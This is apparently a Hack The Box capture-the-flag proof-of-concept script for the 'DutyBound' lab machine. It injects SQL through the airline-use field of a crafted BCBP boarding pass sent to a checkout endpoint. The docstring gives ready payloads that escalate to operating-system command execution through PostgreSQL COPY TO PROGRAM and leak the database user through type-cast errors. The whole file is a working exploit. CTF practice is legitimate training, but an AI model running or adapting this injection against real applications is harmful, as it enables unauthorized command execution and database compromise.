#!/usr/bin/env python3
"""DutyBound (HTB) - SQLi in BCBP airline-use field -> COPY TO PROGRAM.

Source write-up: dutybound.txt
Usage:
    python3 poc_htb_dutybound_sqli.py "'); COPY (SELECT 'x') TO PROGRAM 'id';--"
    python3 poc_htb_dutybound_sqli.py "'||(SELECT current_user)::int||'"

Requires a cart with at least one item; the script adds SNK-CRN first.
"""
import sys
import requests

BASE = "https://airsnacks.htb"
ORIGIN = "LHR"


def boarding_pass(airline_use: str, origin: str = ORIGIN) -> str:
    fixed = (
        f"M1{'TEST/USER':<20}E{'ABC123':<7}"
        f"{origin:<3}{'JFK':<3}{'BA':<3}{'0123':<5}"
        f"298Y{'012A':<4}{'0001A':<5}1"
    )
    conditional = ">70B0WW6298BBA 03125" + airline_use
    if len(fixed) != 58:
        raise SystemExit(f"fixed section is {len(fixed)} chars, expected 58")
    if len(conditional) > 255:
        raise SystemExit("conditional section too long (max 255)")
    return fixed + f"{len(conditional):02X}" + conditional


def main() -> None:
    if len(sys.argv) != 2:
        raise SystemExit(__doc__)
    s = requests.Session()
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.post(BASE + "/cart/add", json={"sku": "SNK-CRN"}, timeout=15)
    r = s.post(
        BASE + "/checkout/boarding-pass/verify",
        json={"raw": boarding_pass(sys.argv[1])},
        timeout=20,
    )
    print(r.status_code, r.text)


if __name__ == "__main__":
    main()
